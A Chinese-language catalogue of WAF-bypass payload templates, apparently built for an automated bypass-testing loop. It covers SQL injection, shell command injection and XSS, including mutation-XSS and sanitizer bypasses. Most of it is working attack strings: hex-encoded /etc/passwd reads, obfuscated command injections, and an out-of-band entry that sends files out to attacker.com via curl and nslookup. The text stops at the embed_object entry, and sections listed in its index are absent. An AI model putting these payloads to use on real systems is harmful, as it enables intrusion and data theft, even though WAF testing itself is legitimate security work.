# 高级绕过知识库（纯语义层）

> **定位**：弹药广度库。每个原语是否对当前 WAF 有效，**由学习循环的实测通过率说了算**——
> 有效维度获得 `{verified}` 标记并被聚焦深挖，无效维度自动剪枝。
> 本库保证"永远有没试过的方向"，学习循环保证"试的方向是有效的"。
>
> **范围**：纯语义层（词法/语法/语义/协议），**不含编码变形维度**（URL/Base64/Hex/Unicode 等整段编码留给未来 encoding-bypass skill）。
>
> **原语 id 格式**：`<scenario>:<layer>:<name>`，corpus 的 `mechanism.primitives[].id` 与本库标题一一对应。

## 场景快速索引

| 场景 | 层 | 原语 |
|------|----|------|
| sqli | lexical | comment_split / version_comment / whitespace_sub / quote_split / case_flip / double_write / wide_byte |
| sqli | syntactic | operator_swap / ident_zero / null_replacement / function_backtick / query_restructure / hpp |
| sqli | semantic | gtid_subset / math_zero / prepared_stmt / sys_schema |
| cmdi | lexical | quote_split / backslash / ifs / ansi_c_quoting |
| cmdi | syntactic | glob / brace_expansion / parameter_expansion / logical_chain |
| cmdi | semantic | env_concat / oob |
| xss | context | tag_bypass / attr_event / js_string / url_proto / dom_sink / rawtext_escape / form_vectors / base_href / embed_object / srcdoc / meta_refresh / css_injection / import_map / svg_xlink / math_mtext / event_more |
| xss | mutation | mxss_noscript / mxss_svg / mxss_template / mxss_mathml / mxss_flatten / mxss_comment / mxss_attr_closer |
| xss | obfuscation | js_func_obfuscation / comment_slice / from_charcode / indirect_exec / regex_source / tagged_template / unicode_escape_id / entity_attr / fullwidth_nfkc / keyword_assemble |
| xss | semantic | dom_clobber / polyglot / parser_differential / detection_rotation |
| xss | protocol | hpp_pollution |
| log4j2 | lookup | lower_upper / empty_default / env_default / date_lookup / non_exist_lookup / ip_bracket / hash_fragment / unicode_lookup |
| log4j2 | protocol | header_injection / nested_recursion |
| upload | extension | multi_extension / double_extension / case_ext / trailing_dot |
| upload | config | htaccess / user_ini |
| upload | content | short_tag / dynamic_function / magic_bytes |
| upload | filename | filename_star / crlf_filename |
| protocol | transfer | chunked / hpp_params / path_normalization / control_chars |

---

# sqli

## sqli:lexical

### sqli:lexical:comment_split — 关键字注释拆分
- **原理**: WAF 正则匹配连续的 `UNION SELECT`；MySQL 解析器会把 `/**/` 折叠为空白，`UN/**/ION` 语义等价于 `UNION`。WAF 看到两段，解析器看到一个关键字。
- **风险**: 需要后端为 MySQL；部分语义引擎会先做注释剥除。
- **模板**:
  - `UN/**/ION SELECT`
  - `SEL/**/ECT`
  - `UN/**/ION/**/SEL/**/ECT`
- **组合**: 可叠加 whitespace_sub、version_comment、大小写。

### sqli:lexical:version_comment — MySQL 版本注释
- **原理**: `/*!50000SELECT*/` 是 MySQL 内联注释——WAF 当普通注释剥掉或忽略，MySQL 5.0.0+ 直接执行注释内语句。`/*!00000SEL*/` 所有版本都执行。
- **风险**: 仅 MySQL；部分 WAF 已支持内联注释解析，但处理有缺陷时正好可绕。
- **模板**:
  - `1 /*!50000UNION*/ SELECT`
  - `/*!00000UNION*/ SELECT`
  - `and{`version`length((select/*!50000schema_name*/from/*!50000information_schema.schemata*/limit 0,1))>0}`
- **组合**: 常与 function_backtick、query_restructure 组合。

### sqli:lexical:whitespace_sub — 空白替换
- **原理**: MySQL 把 `\t\n\v\f\r` `%a0`(0xA0) `%0b` 等视为分隔符；WAF 的单词边界正则可能只认 `%20` 和 `+`。`%a0` 是经典绕过——WAF 正则认为不是空格，MySQL 当作分隔符。
- **风险**: 需确认后端解析器对这些字节的处理。
- **模板**:
  - `1 union%a0select 1,2`
  - `1 union%0bselect 1,2`
  - `1 union/*%aa*/select 1,2`（中文字符+注释组合，绕过正则）
  - `version()%0b`
- **组合**: 可叠加任何层。

### sqli:lexical:quote_split — 引号拆分
- **原理**: `UN'ION'` 在 MySQL 中 `'ION'` 是字符串字面量，`UN'ION'` 解析后等于 `UNION`（相邻字符串自动连接）；WAF 的 `UNION` 连续匹配被打断。
- **风险**: 需要确认后端连接相邻字符串的行为；`'` 本身可能被规则盯上。
- **模板**: `UN'ION' SE'LECT'`、`UN'I''ON'`
- **组合**: 跨场景移植自 CMDi 引号拆分。

### sqli:lexical:case_flip — 大小写混用
- **原理**: 简单层。低价值但零成本，常与其他原语叠加；**单独使用不构成高质量样本**（学习循环会对纯 case 维度降权）。
- **模板**: `uNiOn sElEcT`、`AnD`
- **组合**: 叠加 comment_split / whitespace_sub 等。

### sqli:lexical:double_write — 双重写
- **原理**: `UNIunionON SELselectECT`——WAF 剥掉一次 `union` 后剩 `union` 逃过检测；或 WAF 匹配到子串但后端解析出完整关键字。
- **风险**: 依赖 WAF 的剥除/匹配行为，不确定性高，正是盲区探测价值所在。
- **模板**: `UNIunionON SELselectECT`、`SELSELECTECT`
- **组合**: 可与 comment_split 叠加深嵌套。

### sqli:lexical:wide_byte — 宽字节
- **原理**: 在 GBK/GB2312 编码下，`%df` + `'` 时 `0xdf` 吞掉转义反斜杠成宽字符，单引号逃逸成功。WAF 按 UTF-8 解码看正常。
- **风险**: 依赖后端字符集为 GBK 系（MySQL `SET NAMES gbk`）；当前远程源站静态无反射，主要用于 WAF 层判定其是否拦截宽字节形态。
- **模板**: `1%df%27 union select`、`id=1%df%27 and 1=1`
- **组合**: 编码/字符集类。

---

## sqli:syntactic

### sqli:syntactic:operator_swap — 运算符替代
- **原理**: 不出现 `AND`/`OR` 关键字。`&&`、`||`（PIPES_AS_CONCAT 关闭时=OR）、`REGEXP`、`RLIKE`、`IN`、`BETWEEN`、`LIKE`、`&`、`|`、`^`、`<<`、`>>` 都能表达逻辑，绕关键字正则。
- **风险**: `||` 语义取决于后端 SQL 模式；需确认。
- **模板**:
  - `1 && 1=1`、`1 || 1=1`
  - `1 REGEXP '^1$'`
  - `id=1 and 1=1` → `id=1%26%26 1=1`
  - `id=1 RLIKE 1`
- **组合**: 与 query_restructure、math_zero 组合出"无 AND/OR 的逻辑"。

### sqli:syntactic:ident_zero — 恒等变形
- **原理**: 用恒成立的表达式替代 `1=1`，避开 `=`。如 `'+0+'`、`-0`、`*1`、位运算。
- **模板**:
  - `id=1*1`、`id=1+0`
  - `id=1-0`
  - `id=1&1`（位与恒真）
- **组合**: 常作为盲注探测，与 operator_swap 叠加。

### sqli:syntactic:null_replacement — NULL 替代
- **原理**: WAF 拦 `NULL` 关键字时，用 `0`、`false`、`char(0x4e554c4c)`、`(0*1337-0)`、`34=35` 替代。
- **模板**:
  - `UNION SELECT 0,0,0`
  - `UNION SELECT false,false,false`
  - `UNION SELECT char(0x4e554c4c),0,0`
  - `UNION SELECT (0*1337-0),1,1`
- **组合**: 与 version_comment 组 UNION 注入。

### sqli:syntactic:string_hex_literal — 十六进制字面量
- **原理**: `'admin'` → `0x61646d696e`，绕引号过滤；MySQL 直接把十六进制字面量当字符串。
- **模板**: `WHERE username=0x61646d696e`、`LOAD_FILE(0x2f6574632f706173737764)`
- **组合**: 与 function_backtick（`` `load_file` ``）组合。

### sqli:syntactic:function_backtick — 反引号函数名
- **原理**: MySQL 反引号包围标识符，`` `version`() `` 等价 `version()`；正则对 `` `version` `` 可能失配。
- **模板**: `` `version`() ``、`` and(select `load_file`(0x2f6574632f706173737764) is not null) ``
- **组合**: 十六进制盲注文件存在性。

### sqli:syntactic:query_restructure — 查询结构重组
- **原理**: 从 `WHERE` 子句逃到非 WHERE 上下文（`ORDER BY`/`HAVING`/`GROUP BY`/`LIMIT`）——很多 WAF 规则只盯 `WHERE` 后的注入。`ORDER BY` 后 `CASE WHEN`、子查询替代 UNION。
- **风险**: 需匹配后端真实注入点结构。
- **模板**:
  - `ORDER BY (CASE WHEN (1=1) THEN 1 ELSE 5 END)`
  - `ORDER BY IF(1=1,1,5)`
  - `AND (SELECT flag FROM flags LIMIT 1)='x'`（子查询替代 UNION 数据提取）
  - `HAVING 1=1`
- **组合**: 与 operator_swap、sys_schema 组合盲注提取。

---

## sqli:semantic

### sqli:semantic:gtid_subset — 报错注入
- **原理**: 冷门报错函数（GTID_SUBSET、GTID_SUBTRACT、NAME_CONST、EXTRACTVALUE、UPDATEXML）在报错信息中带出数据；WAF 覆盖不全（80% 可绕过）。
- **模板**:
  - `1 and GTID_SUBSET(session_user(),1)--+`
  - `1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT flag FROM flags LIMIT 1)))`
  - `1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT flag)),1)`
  - `1 AND NAME_CONST((SELECT flag FROM flags LIMIT 1),1)`
- **组合**: 语义层数据外带核心原语。

### sqli:semantic:math_zero — 数学函数制造 0
- **原理**: `MOD(29,9)`=0、`POINT(29,9)`、`POWER(5,5)` 等产生 0/假值，替代 `1=0`/`false`，避开关键字。
- **模板**: `1 and mod(29,9) Order by 10--`、`1 and point(29,9) Order by 10--`、`1 && power(5,5) Order by 10--`
- **组合**: 与 operator_swap、query_restructure 组无关键字逻辑。

### sqli:semantic:prepared_stmt — 预处理语句
- **原理**: `SET @a=CONCAT('SE','LECT...'); PREPARE s FROM @a; EXECUTE s;`——WAF 只见 `CONCAT` 碎片，攻击 SQL 运行时才拼出。
- **风险**: 需堆叠查询支持（`;` 多语句）。
- **模板**: `1;SET @a=CONCAT('SEL','ECT flag FROM flags');PREPARE s FROM @a;EXECUTE s;`
- **组合**: 与堆叠注入上下文。

### sqli:semantic:sys_schema — 替代 information_schema
- **原理**: `information_schema` 常被拦；`sys.schema_table_statistics_with_buffer`、`sys.x$schema_flattened_keys` 等视图可达同样元数据。
- **模板**: `(select schema_name from sys.schema_table_statistics_with_buffer limit 0,1)`、`union select * from (select 1) a join (select 2) b`（无列名探测）
- **组合**: 与 query_restructure 组合元数据枚举。

---

# cmdi

## cmdi:lexical

### cmdi:lexical:quote_split — 引号拆分
- **原理**: shell 移除引号，`c'a't` → `cat`；WAF 的 `cat` 字符串匹配被打断。**已在本地 lab 实测 11/11 全过。**
- **模板**: `c'a't /e'tc'/pa'sswd`、`ca't' /etc/passwd`
- **组合**: 跨场景移植到 SQLi `UN'ION'`、XSS `on'er'ror'`。

### cmdi:lexical:backslash — 反斜杠
- **原理**: shell 反斜杠转义，`\c\a\t` → `cat`。
- **模板**: `\c\a\t /etc/passwd`、`c\at /e\tc/passwd`
- **组合**: 与 quote_split 对比测试。

### cmdi:lexical:ifs — IFS 变量
- **原理**: `${IFS}` 作为空白，`cat${IFS}/etc/passwd`，绕"命令+空格+路径"特征。
- **模板**: `cat${IFS}/etc/passwd`、`;ls${IFS}-la${IFS}/`
- **组合**: 与变量拼接叠加。

### cmdi:lexical:ansi_c_quoting — ANSI-C 引号
- **原理**: `$'\x63\x61\x74'` 产生 `cat`；整个命令可写成十六进制转义序列，WAF 看不到明文命令名。
- **模板**: `$'\x63\x61\x74' $'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
- **组合**: 最彻底的词法隐藏。

---

## cmdi:syntactic

### cmdi:syntactic:glob — 通配符
- **原理**: shell glob 展开，`/???/passwd` 或 `c*` 匹配命令；WAF 按字面匹配失手。
- **风险**: glob 歧义（多匹配时行为不定），需目标环境唯一匹配。
- **模板**: `cat /???/passwd`、`/bin/?at /etc/passwd`、`cat /e??/passwd`
- **组合**: 与引号拆分叠加双重混淆。

### cmdi:syntactic:brace_expansion — 花括号展开
- **原理**: `{cat,/etc/passwd}` 展开为两个词 `cat /etc/passwd`。
- **模板**: `{cat,/etc/passwd}`、`{ls,-la,/}`
- **组合**: 命令+参数整体花括号。

### cmdi:syntactic:parameter_expansion — 参数展开
- **原理**: `${PATH:0:1}` 取路径首字符 `/`，拼出命令/路径字符；WAF 看不到完整字符串。
- **模板**: `${PATH:0:1}bin${PATH:0:1}cat ${PATH:0:1}etc${PATH:0:1}passwd`（bash-only）
- **风险**: dash（/bin/sh）不支持；后端若是 dash 需改用其他原语。
- **组合**: 与 env_concat 叠加。

### cmdi:syntactic:logical_chain — 逻辑链稀释
- **原理**: 用无害命令稀释 token 序列：`file /etc/motd && cat /srv/data/secret`——WAF 看整条是"文件检查+读取"，可能不匹配单命令特征。
- **模板**: `:;true && cat /etc/passwd`、`file /dev/null;cat /srv/app/config/database.cnf`
- **组合**: 语义层稀释。

---

## cmdi:semantic

### cmdi:semantic:env_concat — 环境变量拼接
- **原理**: 从环境变量取字符拼命令（`${HOME:0:1}` 等），或插入未初始化变量 `$foo` 打断关键字。
- **模板**: `ca$foo t /etc/passwd`（未初始化变量稀释）、`$HOME/bin/$(...)`
- **组合**: 词法+语法多层。

### cmdi:semantic:oob — 外带
- **原理**: `nslookup $(cat flag|tr -d '\n').attacker.com` 把数据外带到 DNS；WAF 只见 nslookup 域名。
- **风险**: 需要 OOB 接收设施（本仓库 app-log4j 可充当）；远程静态源站无命令执行，仅测 WAF 是否拦该形态。
- **模板**: `;nslookup $(cat /etc/hostname).attacker.com`、`;curl http://attacker.com/$(cat /flag)`
- **组合**: 语义层高级。

---

# xss

## xss:context

### xss:context:tag_bypass — 标签逃逸
- **原理**: 在标签间上下文注入新标签；用浏览器容错（省略引号/闭合、大小写、属性组合）避开 WAF 的 `<script` 特征。2024-2025 绕过主战场是"HTML5 自动触发事件 + 冷门标签"——WAF 黑名单漏了这些事件名。
- **风险**: 部分事件依赖现代浏览器（popover/onbeforetoggle 需 114+，hidden=until-found 需 102+）；IE-only 向量（isindex action、table background）只在旧浏览器验证。
- **模板**:
  - `<img src=x onerror=alert(1)>`、`<svg/onload=alert(1)>`、`<img/src=x/onerror=alert(1)>`（斜杠替代空格）
  - `<details open ontoggle=alert(1)>`、`<details open onbeforetoggle=alert(1)>`（HTML5 自动触发，Cloudflare/CloudFront/Imperva/Akamai 均有案例）
  - `<marquee onstart=alert(1)>`、`<marquee loop=1 width=0 onfinish=alert(1)>`、`<marquee width=10 loop=2 behavior=alternate onbounce=alert(1)>`（Web Knight/Dot Defender/F5 ASM 案例）
  - `<input autofocus onfocus=alert(1)>`、`<select autofocus onfocus=alert(1)>`、`<textarea autofocus onfocus=alert(1)>`、`<keygen autofocus onfocus=alert(1)>`
  - `<button popovertarget=x>x</button><div popover id=x onbeforetoggle=alert(1)>`（Popover API）
  - `<html onbeforematch=alert(1)><div hidden=until-found id=x></div>`（hidden=until-found）
  - `<body onpageshow=alert(1)>`、`<body onresize=alert(1)>`
  - `<dialog open onclose=alert(1)>`（比 script/img 过滤少）
  - `<video><source onerror=alert(1)>`、`<audio autoplay onplaying=alert(1)>`、`<video poster=javascript:alert(1)//>`（IE）
  - `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`（animateTransform/set/animateMotion 同理）、`<svg><feImage onload=alert(1) href=data:,>`
  - `<style>@keyframes x{}</style><div onanimationstart=alert(1) style=animation:x\ 1s>`（动画事件自动触发）、`<div ontransitionend=alert(1) style=transition:all\ 1s>`
  - `<table background=javascript:alert(1)>`（IE6/旧 Opera）
  - `<isindex type=image src=1 onerror=alert(1)>`、`<isindex action=javascript:alert(1) type=image>`
- **组合**: 事件处理器混淆、属性拆分、大小写/空白变体。

### xss:context:attr_event — 属性事件注入
- **原理**: 属性值上下文里闭合引号注入事件处理器；利用浏览器容错（`>`/引号被滤时的自动闭合、`//` 吞尾、碎片注入）+ 冷门事件处理器（onauxclick/onpointerenter 等黑名单常不全）+ 属性值内实体解码（WAF 不解，浏览器解）。
- **风险**: 引号被过滤时用无引号或 `//` 收尾；`>` 被滤时靠属性自动闭合（`" autofocus onfocus="alert(1)` 无需 `>`）。
- **模板**:
  - `"><img src=x onerror=alert(1)>`
  - `' onfocus=alert(1) autofocus=`
  - `" autofocus onfocus="alert(1)`
  - `" autofocus onfocus=alert(1)//`（`>` 被滤时用 `//` 吞尾）
  - `<a"/onclick=(confirm)()>click`（非空白填充符，Cloudflare 案例）
  - `"o<x>nmouseover=alert<x>(1)//`（碎片注入绕剥标签）
  - 属性值内实体解码：`<img src=x onerror=a&#x6c;ert(1)>`（十六进制/十进制/前导零/省略分号变体：`&#0006c;`、`&#108ert`）
  - 冷门事件：`onauxclick` / `ondblclick` / `oncontextmenu` / `onmouseleave` / `ontouchcancel` / `onpointerenter`
- **组合**: 与实体编码（编码 skill）、tagged_template 叠加。

### xss:context:js_string — JS 字符串逃逸
- **原理**: JS 上下文闭合字符串注入；反斜杠/引号/模板字符串变体；模板字面量 `${}` 注入、正则字面量 `.source` 拼字符串、`location` 赋值当 sink。
- **风险**: 需确认反射进的是字符串还是模板上下文；`eval`/`alert` 被滤时叠 indirect_exec。
- **模板**:
  - `';alert(1)//`、`\';alert(1)//`
  - `${alert(1)}`（模板字面量注入）
  - `');eval(alert(1));//`
  - `'${alert(1)}'`（反斜杠被转义时的模板变体）
  - `location=javascript:alert(1)`（location 赋值 sink）
  - `location=/javascript:/.source+location`（正则 source 拼协议）
  - `document.location='java\tscript:alert(1)'`（scheme 内插空白）
  - `onblur=location="javascript:aler"+"t%2"+"81%2"+"9`（字符串拼接 + URL 括号，XSS Challenge 案例）
- **组合**: 与 js_func_obfuscation、indirect_exec 叠加。

### xss:context:url_proto — URL 协议注入
- **原理**: `javascript:` 伪协议进入 URL 上下文；用混淆绕过 `javascript:` 特征。scheme 内插空白/实体、协议相对 `//`、data:/vbscript:/blob: 等替代。浏览器对 URL scheme 大小写不敏感且容忍 scheme 内空白（现代修复已剥空白，需实测）。
- **风险**: data:text/html 在部分 sink 不执行（Nuxt CVE-2026-53722 案例仅产生同 tab 钓鱼面）；vbscript: 仅 IE。
- **模板**:
  - `javascript:alert(1)`、`JaVaScRiPt:alert(1)`（大小写）
  - `java\tscript:alert(1)`、`java\nscript:alert(1)`、`java%0ascript:alert(1)`、`java%09script:alert(1)`（scheme 内空白）
  - `j&#x61;vasc&#x72;ipt&#x3a;alert(1)`（实体编码 scheme，浏览器属性值解码，Akamai 案例）
  - `javascript:\u0061lert(1)`（JS Unicode 转义）
  - `javascript://%250Aalert(1)//`（`//` 注释 + 编码换行）
  - `javascript:`${alert(1)}``（模板字面量包裹）
  - `data:text/html,<script>alert(1)</script>`、`data:text/html,<svg onload=alert(1)>`
  - `data:text/javascript,alert(1)`
  - `<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>`
  - `vbscript:alert(1)`（IE）、`livescript:`/`mocha:`/`jar:`（旧浏览器，Kirby CMS CVE-2026-45368 黑名单口径）
  - `blob:`（URL.createObjectURL 动态 import）
  - 协议相对：`//evil.com/...`（继承当前 scheme）
- **组合**: 与编码 skill 的实体/URL 编码叠加。

### xss:context:dom_sink — DOM 型
- **原理**: 数据进 `innerHTML`/`eval`/`document.write`/`location` 等 sink；WAF 只查传输层，DOM 拼接在客户端完成。
- **模板**: `#<img src=x onerror=alert(1)>`、`javascript:alert(1)//#`
- **组合**: 需浏览器验证（标记 pending_verification）。

## xss:mutation

### xss:mutation:mxss_noscript — mXSS noscript
- **原理**: 浏览器重解析造成标签错位，payload 初始无害、渲染后变成可执行。HTML 规范明确"序列化再解析片段不保证还原原始树"。
- **模板**: `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`
- **组合**: 冷门高级。

### xss:mutation:mxss_svg — mXSS svg foreignObject
- **原理**: SVG + foreignObject + iframe 组合重解析；SVG `<title>/<desc>` 也可把 HTML 表插入 SVG（命名空间集成点）。
- **模板**: `<svg><foreignObject><p><iframe src="javascript:alert(1)"></iframe></p></foreignObject></svg>`
- **组合**: 冷门高级。

### xss:mutation:mxss_template — mXSS template
- **模板**: `<template><script>alert(1)</script></template>`
- **组合**: 冷门高级。

### xss:mutation:mxss_mathml — mXSS MathML 命名空间混淆
- **原理**: `<math><mtext><table><mglyph><style>` 等在 HTML/MathML 命名空间间切换，浏览器重解析时 `<style>` 内容被当 HTML 解析，逃过 WAF 只查顶层标签的规则（DOMPurify ≤2.0.17 绕过同款）。
- **模板**:
  - `<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>`
  - `<math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`
  - `<math><mi xlink:href="javascript:alert(1)">XSS</mi>`
- **组合**: 冷门高级，与 mxss_flatten 组合。

### xss:mutation:mxss_flatten — 嵌套展平（512 层限制）
- **原理**: 浏览器对 >512 层嵌套标签执行"展平"而不保留命名空间，重解析时 `<caption>`/`<style>` 内容被提升到 HTML 命名空间，payload 二次解析才变可执行（DOMPurify 3.1.0 绕过 @IcesFont 同款）。
- **风险**: 依赖浏览器重解析；payload 很长；需精确控制嵌套层数。
- **模板**: `<style><a title="</svg></style><img src onerror=alert(1)>"></a></style>` + 深度嵌套包裹至 512+ 层
- **组合**: 与 mxss_mathml 组合。

### xss:mutation:mxss_comment — 注释内变异
- **原理**: DOMPurify 补丁只查文本节点变异不查注释，注释内构造的闭合序列在重解析后生效。
- **模板**: `<!--<img src=x alt="--><img src=x onerror=alert(1)>">`（注释内放闭合）
- **组合**: 冷门高级。

### xss:mutation:mxss_attr_closer — 属性内闭合标签（重上下文化）
- **原理**: 属性值里藏 `</xmp>`/`</noscript>` 等闭合序列；sink 若把消毒后串包进 xmp/script 等原始文本容器再重解析，闭合序列提前结束容器使后续标签激活（CVE-2026-65914 DOMPurify <3.3.2 同款）。
- **风险**: 依赖 sink 的包装上下文。易感包装：script/xmp/iframe/noembed/noframes/noscript；安全：textarea/title/style。
- **模板**: `<img src=x alt="</xmp><img src=x onerror=alert(1)>">`（sink 包装进 `<xmp>...` 时触发）
- **组合**: 与 rawtext_escape 同族。

## xss:obfuscation

### xss:obfuscation:js_func_obfuscation — JS 函数混淆
- **原理**: 绕 `alert`/`eval` 等关键字黑名单：括号属性访问、Function 构造、atob 解码、动态字符串。
- **模板**:
  - `top["al"+"ert"](1)`
  - `Function('ale'+'rt(1)')()`
  - `[].constructor.constructor('alert(1)')()`
  - `eval(atob('YWxlcnQoMSk='))`
  - `onerror=alert`（名称拆分到属性）
- **组合**: 与 js_string 上下文组合。

### xss:obfuscation:comment_slice — 属性/关键字注释切片
- **原理**: 属性名/函数名插入注释或换行（HTML 属性解析容忍）。
- **模板**: `<svg o/**/n/**/load="alert(1)">`、`<img src=x onload=`（换行）
- **组合**: 与 tag_bypass 叠加。

### xss:obfuscation:from_charcode — String.fromCharCode 动态构造
- **原理**: `alert(1)` 逐字符 char code 构造，payload 无 alert( 明文。
- **模板**: `eval(String.fromCharCode(97,108,101,114,116,40,49,41))`、`onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))`
- **组合**: 与 attr_event 叠加。

### xss:obfuscation:indirect_exec — 间接执行
- **原理**: `alert`/`eval`/括号被滤时，用 setTimeout/setInterval 字符串参数（隐式 eval）、location 赋值、onerror+throw、数组方法回调、Reflect API 间接触达执行。
- **风险**: onerror+throw 依赖全局 onerror sink；数组回调法需数组非空；需浏览器验证。
- **模板**:
  - `setTimeout('ale'+'rt(2)')`、`setInterval('ale'+'rt(10)')`（字符串参数=隐式 eval）
  - `setTimeout\`alert\x281\x29\``（标签模板无括号）
  - `onerror=alert;throw 23`（无括号执行）、`onerror=eval;throw'=alert\x2823\x29'`
  - `[7].map(alert)`、`[8].find(alert)`、`[].sort.call\`${alert}23\``
  - `Reflect.apply(eval,window,['alert(1)'])`、`Reflect.construct(Function,['alert(1)'])()`
  - `eval.call\`${'alert\x2823\x29'}\``、`eval.apply\`${[`alert\x2823\x29`]}\``
  - `location.replace\`javascript:alert\x281\x29\``
  - `throw onerror=eval,Error\`alert\x2823\x29\``（Firefox）
  - `new Function('alert(1)')()`、`Function("ale"+"rt(1)")()`
- **组合**: 与 js_string、tagged_template 叠加。

### xss:obfuscation:regex_source — 正则字面量 source
- **原理**: 正则字面量 `.source` 返回模式文本，`/al/.source + /ert/.source` 运行时拼出 `alert`——payload 中不出现目标字符串。
- **模板**: `top[/al/.source+/ert/.source](1)`、`location=/javascript:/.source+location`
- **组合**: 与 indirect_exec 叠加。

### xss:obfuscation:tagged_template — 标签模板
- **原理**: 反引号调用函数无需括号，`alert\`1\``；`setTimeout\`...\`` 隐式 eval；括号被滤时的首选。
- **模板**: `alert\`1\``、`setTimeout\`alert\x281\x29\``、`new Function\`return alert\`\`1\``、`alert?.()`
- **组合**: 与 indirect_exec、js_string 叠加。

### xss:obfuscation:unicode_escape_id — 标识符内 Unicode 转义
- **原理**: JS 标识符中 `\u0061lert` 解析为 `alert`，WAF 只查 `alert` 字面量则失手（词法层语义化使用 Unicode，非整段编码）。
- **模板**: `<script>\u0061lert(1)</script>`、`<svg onload=co\u006efirm(1)>`、`window['al\x65rt'](1)`、`<svg onload='new Function*["Y000!"].find(al\u0065rt)*'>`（ModSecurity 案例）
- **组合**: 与 js_func_obfuscation 叠加。

### xss:obfuscation:entity_attr — 属性值实体解码
- **原理**: 浏览器先对属性值做 HTML 实体解码再交给 JS；WAF 查原始字节。实体可用十进制/十六进制/前导零/省略分号等容错变体。
- **模板**:
  - `<img onerror=a&#x6c;ert(1) src=a>`、`<img onerror=a&#0006c;ert(1) src=a>`、`<img onerror=a&#108ert(1) src=a>`
  - `<img onerror=eval('al&#x5c;u0065rt(1)') src=a>`（反斜杠本体也实体化）
  - `<iframe src=j&#x61;vasc&#x72;ipt&#x3a;alert(1)>`
- **组合**: 与 attr_event、url_proto 叠加。

### xss:obfuscation:fullwidth_nfkc — 全角字符 NFKC 归一化
- **原理**: 全角字符（如 `＄` U+FF04）经 NFKC 归一化回 ASCII；WAF 按原始字节匹配失手，后端做了 NFKC 归一化则还原（F5 BIG-IP `＄{7*7}` 案例）。
- **风险**: 全角字母在浏览器 JS 中不一定归一化执行（`＜ｓｃｒｉｐｔ＞` 全角标签不执行）；仅对执行 NFKC 的后端有效，可靠性低于实体解码，需实测。
- **模板**: `q=＄{7*7}`（全角 $，NFKC 后端还原为 `${7*7}`）
- **组合**: 字符集/编码线。

### xss:obfuscation:keyword_assemble — 运行时拼关键字
- **原理**: `alert` 字符串被滤时用多种运行时拼装避开字面量：字符串拼接、charCode、atob、进制转换、原型链。
- **模板**:
  - `window['ale'+'rt'](1)`、`self[`al`+`ert`](1)`、`globalThis['ale'+'rt'](1)`
  - `window[String.fromCharCode(97,108,101,114,116)](1)`
  - `window[atob('YWxlcnQ=')](1)`
  - `top[8680439..toString(30)](1)`（base-30 数值，Cloudflare 案例）
  - `[]['constructor']['constructor']('alert(1)')()`、`({}).constructor.constructor('alert(1)')()`
  - `Object.getPrototypeOf(window).alert.call(this,1)`、`Reflect.get(window,'alert')(1)`
  - `window['al\x65rt'](9)`（转义拼装）
- **组合**: 与 js_func_obfuscation 合并/叠加。

### xss:context:svg_xlink — SVG xlink:href 协议
- **原理**: SVG `<a xlink:href=javascript:>` 触发，javascript: 不在 href 黑名单上下文。
- **模板**: `<svg><a xlink:href="javascript:alert(1)">x</a></svg>`、`<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=javascript:alert(1)>`
- **组合**: 冷门标签。

### xss:context:math_mtext — MathML mtext
- **原理**: MathML 标签容错解析，`<math><mtext>` 内可放 HTML。
- **模板**: `<math><mtext><a href="javascript:alert(1)">x</a></mtext></math>`
- **组合**: 冷门标签。

### xss:context:event_more — 冷门事件处理器
- **原理**: onpointerenter/onauxclick/onmouseenter/ontouchstart/onclick/onmouseover 等冷门事件，WAF 黑名单常不全。
- **模板**: `<img src=x onpointerenter=alert(1)>`、`<img src=x onauxclick=alert(1)>`、`<body onscroll=alert(1)>`、`<a onauxclick=alert(1)>`
- **组合**: 与 tag_bypass、obfuscation 叠加。

### xss:context:rawtext_escape — 原始文本模式逃逸
- **原理**: `<xmp>/<plaintext>/<listing>/<noembed>/<noframes>/<noscript>` 把内容当原始文本处理；注入闭合标签把解析器切回普通模式，再放可执行标签。WAF 只查 `<script`/`<img` 特征，不识这些"切模式"标签。
- **风险**: `<plaintext>` 之后所有内容都是文本；多数靠 sink 二次重解析触发（mXSS 家族），需浏览器验证。
- **模板**:
  - `<xmp><script>alert(1)</script></xmp>`、`<listing><script>alert(1)</script></listing>`
  - `<plaintext><script>alert(1)</script>`
  - `<noembed><p title="</noembed><img src=x onerror=alert(1)>">`
  - `<noframes><p title="</noframes><img src=x onerror=alert(1)>">`
  - `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`（mXSS）
- **组合**: 与 mxss_noscript 等重解析原语族。

### xss:context:form_vectors — 表单 action 协议向量
- **原理**: 事件处理器被滤时，`<form action>` / `<button formaction>` / `<isindex action>` 直接执行 `javascript:` URL，无需 on* 属性。
- **风险**: 通常需点击提交（除非 autofocus + JS 自动 submit）；适合与 url_proto scheme 混淆叠加。
- **模板**:
  - `<form action=javascript:alert(1)><input type=submit>`
  - `<form><button formaction=javascript:alert(1)>click`
  - `<form><isindex formaction="javascript:confirm(1)">`
  - `<isindex action=javascript:alert(1) type=image>`
  - `<isindex x="javascript:" onmouseover="alert(1)">`（scheme 拆分到两属性）
- **组合**: 与 url_proto 叠加。

### xss:context:base_href — base 标签劫持
- **原理**: `<base href>` 改变页面所有相对 URL 的解析基准，可把 `<script src=相对路径>` 引到攻击者域；还能配合 CSP nonce 偷渡（`<base href=data:><script nonce=页面泄露的 nonce src=text/javascript,alert(1)>`）。
- **风险**: 依赖页面存在相对路径 script 引用或 nonce 泄露；非即时执行（需后续加载触发）。
- **模板**:
  - `<base href="//evil.com/"><script src="legit.js"></script>`
  - `<base href="data:"><script nonce="NONCE" src="text/javascript,alert(1)"></script>`（CSP strict-dynamic 场景）
  - `<base id=isDevelopment href=https://attacker>`（DOM clobber + base 组合，Intigriti 2024-07）
- **组合**: 与 dom_clobber 组合。

### xss:context:embed_object — embed/object 数据容器
- **原理**: `<embed src>` / `<object data>` 接受 data: 协议文档，无需 on* 事件；WAF 若只拦 iframe/img 则漏。
